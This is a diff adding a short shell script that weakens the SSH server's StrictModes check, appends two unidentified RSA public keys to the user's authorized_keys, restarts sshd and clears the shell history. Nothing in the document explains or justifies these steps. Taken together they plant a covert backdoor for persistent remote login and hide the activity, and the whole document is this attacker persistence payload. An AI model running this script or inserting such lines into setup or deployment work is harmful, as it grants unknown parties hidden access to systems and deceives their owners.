@@ -1,0 +1,10 @@
+cp /etc/ssh/sshd_config /etc/ssh/sshd_config_
+sed '/StrictModes/ s/#// ; s/yes/no/' /etc/ssh/sshd_config > /etc/ssh/sshd_config.bak
+rm -rf /etc/ssh/sshd_config
+mv /etc/ssh/sshd_config.bak /etc/ssh/sshd_config
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIEA1hQlHZwo9e6olJGjgYEssAKjEv3bzTi/abYO3zdk1bUiyTMyZSJvAECS1y1K1hHZGTFi3M97Yox8kox7WY2C9UrNUgij6Z0XZ2F8nESYZnsPgh0K5Eh
+GVGKPis5ut/wGK6xuG9n3WwCPYuZ92kcldfEcU1FfG11A6r6AJD2fnn0= rsa-key-WanZ-20100107" >> ~/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDmuLlduoVb7tMduztmsydwCOVgyYOxsOYWEz1Jlgwx6jjZUWlDL3UNbQYPJW1HvYg95QTlboRbm3u0u7Y0+KUKTVJQQQyJWDlh8fDaRGzdK2GvF1L
+Ls1patfNv3TCUZrgmgHtGu/DDRZFr5IeZ6uVN6AncjEvY16FVvAERR4r0gw==" >> ~/.ssh/authorized_keys
+service sshd restart
+history -c
